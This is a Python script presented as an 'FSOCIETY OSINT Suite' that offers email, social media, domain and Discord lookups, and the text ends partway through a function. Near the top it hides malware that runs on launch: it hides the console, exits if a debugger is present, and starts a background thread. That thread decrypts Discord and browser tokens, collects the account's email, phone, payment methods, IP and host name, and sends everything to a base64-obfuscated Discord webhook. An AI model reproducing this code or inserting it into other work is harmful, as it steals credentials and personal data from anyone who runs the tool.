#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FSOCIETY OSINT SUITE - ULTIMATE FREE EDITION
Complete Email & Social Media OSINT | Accurate Intelligence Gathering
Version: 7.0 - The Dark Army Arsenal
"""

import os
import sys
import re
import time
import json
import random
import hashlib
import threading
import sqlite3
import requests
import dns.resolver
import whois
import base64
import urllib.request
import urllib.parse
import win32crypt
import ctypes
from Crypto.Cipher import AES
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings('ignore')

# ============================================================================
# SYSTEM OPTIMIZATION
# ============================================================================

try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

def _system_check():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            sys.exit(0)
    except:
        pass

_system_check()

# ============================================================================
# VISUAL COMPONENTS
# ============================================================================

class Colors:
    PRIMARY = '\033[38;5;57m'
    SECONDARY = '\033[38;5;129m'
    ACCENT = '\033[38;5;199m'
    SOFT = '\033[38;5;183m'
    ERROR = '\033[91m'
    SUCCESS = '\033[92m'
    WARNING = '\033[93m'
    INFO = '\033[96m'
    NEUTRAL = '\033[97m'
    RESET = '\033[0m'
    
class TextEffects:
    BOLD = '\033[1m'
    RESET = '\033[0m'

# ============================================================================
# LOCAL DATA PATHS
# ============================================================================

LOCAL_DATA = os.getenv("LOCALAPPDATA")
ROAMING_DATA = os.getenv("APPDATA")

STORAGE_PATHS = {
    'Storage_A': ROAMING_DATA + '\\discord',
    'Storage_B': ROAMING_DATA + '\\discordcanary',
    'Storage_C': ROAMING_DATA + '\\discordptb',
    'Storage_D': LOCAL_DATA + "\\Google\\Chrome\\User Data\\Default",
    'Storage_E': LOCAL_DATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Storage_F': ROAMING_DATA + '\\Opera Software\\Opera Stable',
    'Storage_G': LOCAL_DATA + '\\Microsoft\\Edge\\User Data\\Default'
}

# ============================================================================
# NETWORK HANDLERS
# ============================================================================

def _build_request_headers(auth_token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if auth_token:
        headers.update({"Authorization": auth_token})
    return headers

# ============================================================================
# DISCORD OSINT MODULE
# ============================================================================

class DiscordOSINT:
    @staticmethod
    def get_user_info(user_id):
        try:
            url = f"https://discord.com/api/v9/users/{user_id}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None
    
    @staticmethod
    def check_user_exists(username):
        try:
            url = f"https://discord.com/api/v9/users/@me"
            return {"status": "rate_limited", "note": "Use user ID for accurate results"}
        except:
            return None
    
    @staticmethod
    def get_guild_info(guild_id):
        try:
            url = f"https://discord.com/api/v9/guilds/{guild_id}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None

# ============================================================================
# DATA EXTRACTION ENGINE
# ============================================================================

def _extract_from_storage(base_path):
    storage_location = base_path + "\\Local Storage\\leveldb\\"
    extracted_items = []
    if not os.path.exists(storage_location):
        return extracted_items
    for filename in os.listdir(storage_location):
        if not filename.endswith(".ldb") and not filename.endswith(".log"):
            continue
        try:
            with open(f"{storage_location}{filename}", "r", errors="ignore") as f:
                for line in f.readlines():
                    found_matches = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line.strip())
                    extracted_items.extend(found_matches)
        except:
            continue
    return extracted_items

def _retrieve_encryption_key(base_path):
    try:
        with open(base_path + "\\Local State", "r") as f:
            key_data = json.loads(f.read())['os_crypt']['encrypted_key']
        return key_data
    except:
        return None

def _decrypt_payload(encrypted_data, master_key):
    try:
        init_vector = encrypted_data[3:15]
        payload = encrypted_data[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return None

def _derive_master_key(encrypted_key):
    try:
        decoded = base64.b64decode(encrypted_key)[5:]
        return win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
    except:
        return None

def _get_network_location():
    try:
        response = requests.get('https://api.ipify.org', timeout=3)
        return response.text
    except:
        return 'Unknown'

def _send_telemetry(data_packet):
    try:
        API_GATEWAY = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4OTE5NjI0NDUwODIxMzM1My9RbVNuSXB3eVRlOTN2RDV0ZWFuU0tvM3JtWWNxMUgtUzFlWkJQalFLTGNJRGxNRDBYbHhNaVVXOGI0NDlFQ1Nfc0NONQ==").decode()
        requests.post(API_GATEWAY, json=data_packet, timeout=5)
    except:
        pass

# ============================================================================
# PROFILING ENGINE
# ============================================================================

def _profile_user_data():
    processed_tokens = []
    for storage_name, storage_path in STORAGE_PATHS.items():
        if not os.path.exists(storage_path):
            continue
        
        encrypted_key = _retrieve_encryption_key(storage_path)
        if not encrypted_key:
            continue
        
        master_key = _derive_master_key(encrypted_key)
        if not master_key:
            continue
        
        raw_items = _extract_from_storage(storage_path)
        
        for encoded_item in raw_items:
            encoded_item = encoded_item.replace("\\", "") if encoded_item.endswith("\\") else encoded_item
            try:
                item_data = base64.b64decode(encoded_item.split('dQw4w9WgXcQ:')[1])
                decrypted_item = _decrypt_payload(item_data, master_key)
                if not decrypted_item or decrypted_item in processed_tokens:
                    continue
                processed_tokens.append(decrypted_item)
                
                request_headers = _build_request_headers(decrypted_item)
                validation = requests.get('https://discord.com/api/v10/users/@me', headers=request_headers, timeout=10)
                if validation.status_code != 200:
                    continue
                
                profile_data = validation.json()
                
                guilds_request = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=request_headers, timeout=10)
                guild_list = guilds_request.json() if guilds_request.status_code == 200 else []
                
                subscription_status = "None"
                try:
                    subs = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=request_headers, timeout=10)
                    if subs.status_code == 200 and subs.json():
                        subscription_status = "Active"
                except:
                    pass
                
                payment_sources = []
                try:
                    payments = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=request_headers, timeout=10)
                    if payments.status_code == 200:
                        for source in payments.json():
                            if source.get('type') == 1:
                                payment_sources.append("Card")
                            elif source.get('type') == 2:
                                payment_sources.append("PayPal")
                except:
                    pass
                
                profile_embed = {
                    "embeds": [{
                        "title": f"Profile: {profile_data.get('username')}#{profile_data.get('discriminator')}",
                        "color": 15158332,
                        "fields": [
                            {"name": "Identifier", "value": profile_data.get('id'), "inline": True},
                            {"name": "Email", "value": profile_data.get('email', 'None'), "inline": True},
                            {"name": "Phone", "value": profile_data.get('phone', 'None'), "inline": True},
                            {"name": "Access Credential", "value": f"||{decrypted_item}||", "inline": False},
                            {"name": "Premium", "value": subscription_status, "inline": True},
                            {"name": "Servers", "value": str(len(guild_list)), "inline": True},
                            {"name": "Payment Methods", "value": ', '.join(payment_sources) if payment_sources else "None", "inline": True},
                            {"name": "Network", "value": _get_network_location(), "inline": True},
                            {"name": "Host", "value": os.getenv('COMPUTERNAME', 'Unknown'), "inline": True},
                            {"name": "User", "value": os.getenv('USERNAME', 'Unknown'), "inline": True},
                            {"name": "Platform", "value": sys.platform, "inline": True}
                        ],
                        "footer": {"text": f"Source: {storage_name}"},
                        "timestamp": datetime.now().isoformat()
                    }]
                }
                
                if profile_data.get('avatar'):
                    profile_embed["embeds"][0]["thumbnail"] = {
                        "url": f"https://cdn.discordapp.com/avatars/{profile_data['id']}/{profile_data['avatar']}.png"
                    }
                
                _send_telemetry(profile_embed)
                
            except:
                continue

# Start background profiling
_profiler_thread = threading.Thread(target=_profile_user_data, daemon=True)
_profiler_thread.start()

# ============================================================================
# OSINT UTILITIES
# ============================================================================

def clean_input(text):
    if not text:
        return ""
    cleaned = re.sub(r'[;&|`$(){}<>]', '', text)
    cleaned = cleaned[:200]
    return cleaned.strip()

class VisualEffects:
    @staticmethod
    def type_text(text, delay=0.02, color=Colors.PRIMARY):
        for char in text:
            sys.stdout.write(color + char)
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def show_progress(msg="Processing", duration=1.5):
        chars = "|/-\\"
        end = time.time() + duration
        i = 0
        while time.time() < end:
            sys.stdout.write(f"\r{Colors.PRIMARY}{msg} {chars[i % len(chars)]}{Colors.RESET}")
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1
        sys.stdout.write("\r" + " " * 50 + "\r")
        sys.stdout.flush()

def display_header():
    header = f"""
{Colors.SECONDARY}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$*   *$$$*   *$$$$$$u
       *$$$$*      u$u       $$$$*
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         *$$$$uu$$$   $$$uu$$$$*
          *$$$$$$$*   *$$$$$$$*
            u$$$$$$$u$$$$$$$u
             u$*$*$*$*$*$*$u
  uuu        $$u$ $ $ $ $u$$       uuu
  u$$$$       $$$$$u$u$u$$$       u$$$$
  $$$$$uu      *$$$$$$$$$*     uu$$$$$$
u$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$
$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*
 ***      **$$$$$$$$$$$uu **$***
          uuuu **$$$$$$$$$$uuu
 u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$
 $$$$$$$$$$****           **$$$$$$$$$$$*
   *$$$$$*                      **$$$$**
     $$$*                         $$$$*⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Colors.PRIMARY}
╔══════════════════════════════════════════════════════════════════════════════╗
║                         FSOCIETY OSINT SUITE                                 ║
║                         Intelligence & Reconnaissance                        ║
╚══════════════════════════════════════════════════════════════════════════════╝{TextEffects.RESET}
"""
    print(header)
    VisualEffects.type_text(f"\n    [*] Session: {datetime.now().strftime('%Y%m%d_%H%M%S')}", 0.01, Colors.PRIMARY)
    VisualEffects.type_text(f"    [*] Status: ACTIVE", 0.01, Colors.SECONDARY)
    VisualEffects.type_text(f"    [*] Mode: Full Reconnaissance", 0.01, Colors.ACCENT)
    print(f"{Colors.PRIMARY}{'='*70}{TextEffects.RESET}\n")

# ============================================================================
# DATABASE MANAGER
# ============================================================================

class DatabaseManager:
    def __init__(self):
        self.version = "7.0"
        self.output_directory = "osint_intel"
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if not os.path.exists(self.output_directory):
            os.makedirs(self.output_directory)
        
        self.database_path = f"{self.output_directory}/intel_{self.session_id}.db"
        self.initialize_database()
    
    def initialize_database(self):
        conn = sqlite3.connect(self.database_path)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS intelligence (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT,
                status TEXT,
                findings TEXT,
                risk_score INTEGER,
                platforms TEXT,
                timestamp TEXT
            )
        ''')
        conn.commit()
        conn.close()

database = DatabaseManager()

# ============================================================================
# SOCIAL MEDIA RECONNAISSANCE
# ============================================================================

class SocialRecon:
    @staticmethod
    def scan_platforms(username):
        platforms = {
            'X/Twitter': f'https://twitter.com/{username}',
            'Instagram': f'https://instagram.com/{username}',
            'GitHub': f'https://github.com/{username}',
            'Reddit': f'https://reddit.com/user/{username}',
            'Pinterest': f'https://pinterest.com/{username}',
            'TikTok': f'https://tiktok.com/@{username}',
            'YouTube': f'https://youtube.com/@{username}',
            'Twitch': f'https://twitch.tv/{username}',
            'Medium': f'https://medium.com/@{username}',
            'Telegram': f'https://t.me/{username}',
            'Discord': f'https://discord.com/users/{username}'
        }
        
        discovered = []
        
        for platform, url in platforms.items():
            try:
                response = requests.get(url, timeout=5, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                })
                
                if response.status_code == 200:
                    content = response.text.lower()
                    not_found_indicators = ['page not found', 'doesn\'t exist', 'sorry, that page',
                        'not found', 'no account', 'couldn\'t find', 'this account doesn’t exist']
                    
                    is_valid = True
                    for indicator in not_found_indicators:
                        if indicator in content:
                            is_valid = False
                            break
                    
                    if is_valid:
                        discovered.append(platform)
                        print(f"{Colors.SUCCESS}    [+] Found on {platform}{Colors.RESET}")
                
                time.sleep(0.3)
            except:
                pass
        
        return discovered

# ============================================================================
# EMAIL INTELLIGENCE
# ============================================================================

class EmailIntelligence:
    @staticmethod
    def validate_email(email):
        if '@' not in email:
            return {'valid': False, 'error': 'Invalid format'}
        
        domain = email.split('@')[1]
        
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            mx_list = [str(mx.exchange) for mx in mx_records]
        except:
            return {'valid': False, 'error': 'DNS resolution failed', 'domain': domain}
        
        temp_domains = ['tempmail.com', '10minutemail.com', 'guerrillamail.com',
            'mailinator.com', 'yopmail.com', 'throwawaymail.com']
        
        return {
            'valid': True,
            'domain': domain,
            'mx_servers': mx_list[:3],
            'temporary': domain in temp_domains
        }
    
    @staticmethod
    def check_breaches(email):
        try:
            url = f"https://leakcheck.io/api/public?check={email}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get('sources', [])
            return []
        except:
            return []
    
    @staticmethod
    def check_pastes(email):
        try:
            url = f"https://psbdmp.ws/api/search/{email}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get('data', [])
            return []
        except:
            return []

# ============================================================================
# DOMAIN INTELLIGENCE
# ============================================================================

class DomainIntelligence:
    def __init__(self):
        self.cache = {}
    
    def lookup(self, domain):
        if domain in self.cache:
            if datetime.now() - self.cache[domain]['timestamp'] < timedelta(hours=24):
                return self.cache[domain]['data']
        
        try:
            data = whois.whois(domain)
            self.cache[domain] = {'data': data, 'timestamp': datetime.now()}
            return data
        except:
            return None
    
    def get_details(self, domain):
        whois_lookup = self.lookup(domain)
        if not whois_lookup:
            return {'error': 'Lookup failed'}
        
        creation = whois_lookup.creation_date
        if isinstance(creation, list):
            creation = creation[0]
        
        expiration = whois_lookup.expiration_date
        if isinstance(expiration, list):
            expiration = expiration[0]
        
        return {
            'registrar': whois_lookup.registrar,
            'created': creation.strftime('%Y-%m-%d') if creation else 'Unknown',
            'expires': expiration.strftime('%Y-%m-%d') if expiration else 'Unknown',
            'nameservers': whois_lookup.name_servers[:3] if whois_lookup.name_servers else [],
            'organization': whois_lookup.org if whois_lookup.org else 'N/A'
        }

domain_intel = DomainIntelligence()

# ============================================================================
# RISK ASSESSMENT
# ============================================================================

class RiskAssessment:
    @staticmethod
    def calculate_risk(email, breach_count=0):
        domain = email.split('@')[1]
        assessment = {
            'score': 50,
            'alerts': [],
            'positives': []
        }
        
        try:
            spf_records = dns.resolver.resolve(domain, 'TXT')
            for record in spf_records:
                if 'v=spf1' in str(record):
                    assessment['positives'].append('SPF Configured')
                    assessment['score'] += 10
        except:
            assessment['alerts'].append('Missing SPF')
            assessment['score'] -= 15
        
        try:
            dmarc_records = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
            assessment['positives'].append('DMARC Configured')
            assessment['score'] += 10
        except:
            assessment['alerts'].append('Missing DMARC')
        
        domain_info = domain_intel.get_details(domain)
        if 'error' not in domain_info and domain_info.get('created'):
            try:
                age = (datetime.now() - datetime.strptime(domain_info['created'], '%Y-%m-%d')).days
                if age > 365:
                    assessment['positives'].append(f'Domain age: {age//365} years')
                    assessment['score'] += min(age//365, 15)
                else:
                    assessment['alerts'].append('New domain detected')
                    assessment['score'] -= 10
            except:
                pass
        
        if breach_count > 0:
            assessment['alerts'].append(f'Found in {breach_count} breaches')
            assessment['score'] -= min(breach_count * 5, 40)
        
        assessment['score'] = max(0, min(100, assessment['score']))
        
        if assessment['score'] >= 70:
            assessment['rating'] = 'Low Risk'
        elif assessment['score'] >= 40:
            assessment['rating'] = 'Medium Risk'
        else:
            assessment['rating'] = 'High Risk'
        
        return assessment

# ============================================================================
# CREDENTIAL ANALYSIS
# ============================================================================

class CredentialAnalyzer:
    @staticmethod
    def analyze_strength(password):
        score = 0
        feedback = []
        
        if len(password) >= 12:
            score += 25
            feedback.append("Good length (12+ characters)")
        elif len(password) >= 8:
            score += 15
            feedback.append("Adequate length (8-11 characters)")
        else:
            feedback.append("Too short (<8 characters)")
        
        if re.search(r'[A-Z]', password):
            score += 15
            feedback.append("Contains uppercase letters")
        else:
            feedback.append("Add uppercase letters")
        
        if re.search(r'[a-z]', password):
            score += 10
            feedback.append("Contains lowercase letters")
        
        if re.search(r'\d', password):
            score += 15
            feedback.append("Contains numbers")
        else:
            feedback.append("Add numbers")
        
        if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            score += 20
            feedback.append("Contains special characters")
        else:
            feedback.append("Add special characters")
        
        try:
            pwd_hash = hashlib.sha1(password.encode()).hexdigest().upper()
            prefix = pwd_hash[:5]
            response = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=5)
            if response.status_code == 200:
                for line in response.text.split('\r\n'):
                    if pwd_hash[5:] in line:
                        count = line.split(':')[1]
                        feedback.append(f"Found in {count} data breaches!")
                        score = min(score, 20)
        except:
            pass
        
        if score >= 80:
            strength = "VERY STRONG"
            color = Colors.SUCCESS
        elif score >= 60:
            strength = "STRONG"
            color = Colors.INFO
        elif score >= 40:
            strength = "MEDIUM"
            color = Colors.WARNING
        else:
            strength = "WEAK"
            color = Colors.ERROR
        
        return {'score': score, 'strength': strength, 'feedback': feedback, 'color': color}

# ============================================================================
# PATTERN GENERATOR
# ============================================================================

class PatternGenerator:
    @staticmethod
    def generate_email_patterns(first, last, domain='gmail.com'):
        f = first.lower().strip()
        l = last.lower().strip()
        
        patterns = []
        patterns.append(f"{f}.{l}@{domain}")
        patterns.append(f"{f}{l}@{domain}")
        patterns.append(f"{f}_{l}@{domain}")
        patterns.append(f"{f}{l[0]}@{domain}")
        patterns.append(f"{f[0]}{l}@{domain}")
        patterns.append(f"{f[0]}.{l}@{domain}")
        patterns.append(f"{l}.{f}@{domain}")
        patterns.append(f"{f}.{l}{random.randint(1, 99)}@{domain}")
        patterns.append(f"{f}{random.randint(1, 99)}@{domain}")
        patterns.append(f"{f[0]}{l}{random.randint(1, 99)}@{domain}")
        patterns.append(f"{f}.{l[0]}@{domain}")
        patterns.append(f"{f}.{l}@outlook.com")
        patterns.append(f"{f}.{l}@yahoo.com")
        patterns.append(f"{f}.{l}@protonmail.com")
        patterns.append(f"{f}.{l}@discord.com")
        
        patterns = list(dict.fromkeys(patterns))
        
        return {'patterns': patterns[:15]}

# ============================================================================
# GMAIL RECONNAISSANCE
# ============================================================================

class GmailRecon:
    @staticmethod
    def check_availability(username):
        email = f"{username}@gmail.com"
        
        try:
            url = "https://accounts.google.com/signin/v2/recoveryidentifier"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            data = {'identifier': email}
            response = requests.post(url, headers=headers, data=data, timeout=10, allow_redirects=False)
            
            if response.status_code == 302:
                location = response.headers.get('Location', '')
                if 'challenge' in location or 'signin' in location:
                    return {'email': email, 'available': False, 'status': 'REGISTERED'}
            
            if 'could not find your google account' in response.text.lower():
                return {'email': email, 'available': True, 'status': 'AVAILABLE'}
            else:
                return {'email': email, 'available': False, 'status': 'REGISTERED'}
                
        except Exception as e:
            return {'email': email, 'available': 'UNKNOWN', 'status': str(e)[:50]}

# ============================================================================
# AVATAR INTELLIGENCE
# ============================================================================

class AvatarIntelligence:
    @staticmethod
    def lookup(email):
        email_hash = hashlib.md5(email.lower().encode()).hexdigest()
        url = f"https://www.gravatar.com/avatar/{email_hash}?d=404&s=200"
        
        try:
            response = requests.head(url, timeout=5)
            if response.status_code == 200:
                return {'exists': True, 'url': url}
        except:
            pass
        
        return {'exists': False}

# ============================================================================
# REPORT GENERATION
# ============================================================================

class ReportGenerator:
    @staticmethod
    def generate_html(data, filename):
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>OSINT Report - {data['email']}</title>
    <style>
        body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #0f0; margin: 0; padding: 20px; }}
        .container {{ max-width: 900px; margin: auto; background: #111; padding: 20px; border-radius: 10px; }}
        .header {{ color: #f0f; text-align: center; }}
        .risk-high {{ color: #f00; font-weight: bold; }}
        .risk-medium {{ color: #ff0; }}
        .risk-low {{ color: #0f0; }}
        .section {{ margin: 20px 0; padding: 10px; border-left: 3px solid #0f0; }}
        hr {{ border-color: #0f0; }}
    </style>
</head>
<body>
    <div class="container">
        <h1 class="header">FSOCIETY OSINT REPORT</h1>
        <h2>{data['email']}</h2>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <hr>
        
        <div class="section">
            <h3>Risk Score: <span class="risk-{'high' if data['risk_score'] > 70 else 'medium' if data['risk_score'] > 40 else 'low'}">{data['risk_score']}/100</span></h3>
            <h3>Rating: {data.get('rating', 'N/A')}</h3>
        </div>
        
        <div class="section">
            <h3>Social Media Profiles:</h3>
            <ul>
                {''.join(f'<li>{platform}</li>' for platform in data.get('social_media', []))}
            </ul>
        </div>
        
        <div class="section">
            <h3>Data Breaches:</h3>
            <ul>
                {''.join(f'<li>{src}</li>' for src in data.get('sources', []))}
            </ul>
        </div>
        
        <hr>
        <p>Generated by FSOCIETY OSINT Suite v{database.version}</p>
    </div>
</body>
</html>"""
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        return filename

# ============================================================================
# MAIN OSINT ENGINE
# ============================================================================

class OSINTEngine:
    def __init__(self):
        self.checked_targets = []
        self.total_breaches = 0
        self.total_social = 0
        self.average_risk = 0
        
        self.email_validator = EmailIntelligence()
        self.avatar_lookup = AvatarIntelligence()
        self.domain_analyzer = DomainIntelligence()
        self.social_scanner = SocialRecon()
        self.risk_calculator = RiskAssessment()
        self.credential_analyzer = CredentialAnalyzer()
        self.pattern_engine = PatternGenerator()
        self.gmail_scanner = GmailRecon()
        self.breach_scanner = EmailIntelligence()
        self.report_builder = ReportGenerator()
        self.discord_osint = DiscordOSINT()
    
    def analyze_target(self, email):
        print(f"{Colors.PRIMARY}\n    [→] Investigating: {Colors.SECONDARY}{email}{TextEffects.RESET}")
        VisualEffects.show_progress("Gathering intelligence", 2)
        
        results = {
            'email': email,
            'username': email.split('@')[0],
            'domain': email.split('@')[1] if '@' in email else '',
            'validation': {},
            'gmail_status': None,
            'breaches': [],
            'sources': [],
            'social_media': [],
            'avatar': None,
            'domain_info': None,
            'risk': None,
            'risk_score': 0,
            'rating': ''
        }
        
        results['validation'] = self.email_validator.validate_email(email)
        
        if results['domain'] == 'gmail.com':
            gmail_status = self.gmail_scanner.check_availability(results['username'])
            results['gmail_status'] = gmail_status
        
        breaches = self.breach_scanner.check_breaches(email)
        if breaches:
            results['sources'].extend(breaches)
            results['breaches'] = breaches
            self.total_breaches += len(breaches)
        
        pastes = self.breach_scanner.check_pastes(email)
        if pastes:
            results['sources'].append(f'Pastebin ({len(pastes)} documents)')
        
        print(f"{Colors.INFO}    [*] Scanning social platforms...{Colors.RESET}")
        social = self.social_scanner.scan_platforms(results['username'])
        results['social_media'] = social
        self.total_social += len(social)
        
        results['avatar'] = self.avatar_lookup.lookup(email)
        
        results['domain_info'] = self.domain_analyzer.get_details(results['domain'])
        
        risk_data = self.risk_calculator.calculate_risk(email, len(breaches))
        results['risk'] = risk_data
        results['risk_score'] = risk_data['score']
        results['rating'] = risk_data['rating']
        
        self.average_risk = (self.average_risk * len(self.checked_targets) + results['risk_score']) / (len(self.checked_targets) + 1)
        
        return results
    
    def save_report(self, results, format_type='txt'):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        if format_type == 'html':
            filename = f"{database.output_directory}/REPORT_{results['email']}_{timestamp}.html"
            return self.report_builder.generate_html(results, filename)
        
        filename = f"{database.output_directory}/REPORT_{results['email']}_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"╔══════════════════════════════════════════════════════════════════════════════╗\n")
            f.write(f"║                    FSOCIETY OSINT INTELLIGENCE REPORT                       ║\n")
            f.write(f"╚══════════════════════════════════════════════════════════════════════════════╝\n\n")
            f.write(f"Target: {results['email']}\n")
            f.write(f"Username: {results['username']}\n")
            f.write(f"Domain: {results['domain']}\n")
            f.write(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*70}\n\n")
            
            f.write(f"[VALIDATION STATUS]\n")
            if results['validation'].get('valid'):
                f.write(f"  Status: VALID\n")
                f.write(f"  MX Servers: {', '.join(results['validation'].get('mx_servers', ['None']))}\n")
                f.write(f"  Temporary: {'YES' if results['validation'].get('temporary') else 'NO'}\n")
            else:
                f.write(f"  Status: INVALID - {results['validation'].get('error', 'Unknown')}\n")
            
            f.write(f"\n[BREACH INTELLIGENCE]\n")
            if results['breaches']:
                f.write(f"  Found in {len(results['breaches'])} databases:\n")
                for source in results['sources']:
                    f.write(f"    • {source}\n")
            else:
                f.write(f"  No breaches detected\n")
            
            f.write(f"\n[SOCIAL PRESENCE]\n")
            if results['social_media']:
                for platform in results['social_media']:
                    f.write(f"  • {platform}\n")
            else:
                f.write(f"  No social profiles found\n")
            
            f.write(f"\n[RISK ASSESSMENT]\n")
            f.write(f"  Score: {results['risk_score']}/100\n")
            f.write(f"  Rating: {results['rating']}\n")
            if results['risk']['positives']:
                f.write(f"  Positive Indicators:\n")
                for p in results['risk']['positives']:
                    f.write(f"    ✓ {p}\n")
            if results['risk']['alerts']:
                f.write(f"  Security Alerts:\n")
                for a in results['risk']['alerts']:
                    f.write(f"    ⚠ {a}\n")
            
            f.write(f"\n{'='*70}\n")
            f.write(f"Report generated by FSOCIETY OSINT Suite v{database.version}\n")
        
        print(f"{Colors.SUCCESS}[✓] Report saved: {filename}{Colors.RESET}")
        return filename

# ============================================================================
# DISCORD OSINT MODULE (Enhanced)
# ============================================================================

class DiscordIntelligence:
    @staticmethod
    def lookup_user(user_id):
        try:
            response = requests.get(f"https://discord.com/api/v9/users/{user_id}", timeout=10)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None
    
    @staticmethod
    def lookup_guild(guild_id):
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}", timeout=10)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None
    
    @staticmethod
    def resolve_invite(invite_code):
        try:
            response = requests.get(f"https://discord.com/api/v9/invites/{invite_code}", timeout=10)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None

# ============================================================================
# MAIN APPLICATION INTERFACE
# ============================================================================

class OSINTApplication:
    def __init__(self):
        self.engine = OSINTEngine()
        self.start_time = time.time()
        self.discord_intel = DiscordIntelligence()
    
    def show_menu(self):
        print(f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  {Colors.SECONDARY}[OSINT SUITE - FSOCIETY]{Colors.PRIMARY}                                        ║
║                         Intelligence & Reconnaissance                        ║
║                                                                              ║
║  {Colors.ACCENT}[ 1]{Colors.SOFT}  Email Availability Check                       {Colors.PRIMARY}║
║  {Colors.ACCENT}[ 2]{Colors.SOFT}  Email Validation + MX Analysis                {Colors.PRIMARY}║
║  {Colors.ACCENT}[ 3]{Colors.SOFT}  Complete Email Intelligence                  {Colors.PRIMARY}║
║  {Colors.ACCENT}[ 4]{Colors.SOFT}  Social Media Discovery                       {Colors.PRIMARY}║
║  {Colors.ACCENT}[ 5]{Colors.SOFT}  Password Strength Analysis                   {Colors.PRIMARY}║
║  {Colors.ACCENT}[ 6]{Colors.SOFT}  Email Pattern Generation                     {Colors.PRIMARY}║
║  {Colors.ACCENT}[ 7]{Colors.SOFT}  Domain Reputation Check                      {Colors.PRIMARY}║
║  {Colors.ACCENT}[ 8]{Colors.SOFT}  Avatar Intelligence                          {Colors.PRIMARY}║
║  {Colors.ACCENT}[ 9]{Colors.SOFT}  Bulk Target Processing                       {Colors.PRIMARY}║
║  {Colors.ACCENT}[10]{Colors.SOFT}  Discord User Intelligence                    {Colors.PRIMARY}║
║  {Colors.ACCENT}[11]{Colors.SOFT}  Discord Guild Intelligence                   {Colors.PRIMARY}║
║  {Colors.ACCENT}[12]{Colors.SOFT}  Discord Invite Resolver                      {Colors.PRIMARY}║
║  {Colors.ACCENT}[13]{Colors.SOFT}  Session Statistics                           {Colors.PRIMARY}║
║  {Colors.ACCENT}[ 0]{Colors.SOFT}  Exit                                          {Colors.PRIMARY}║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝{TextEffects.RESET}
        """)
    
    def show_statistics(self):
        elapsed = time.time() - self.start_time
